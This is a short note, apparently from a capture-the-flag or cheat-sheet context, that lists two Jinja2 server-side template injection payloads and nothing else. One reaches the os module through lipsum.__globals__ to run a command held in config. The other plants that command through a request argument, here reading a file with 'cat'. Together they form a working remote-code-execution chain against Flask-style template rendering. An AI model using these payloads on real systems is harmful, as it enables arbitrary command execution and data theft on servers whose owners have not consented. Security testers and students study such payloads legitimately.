SSTI:

*{{lipsum.__globals__.os.popen(config.x).read()}}


*{{config.update(x=request.args[%27a%27])}}&a=cat%20truly_an_arbitrarily_named_file
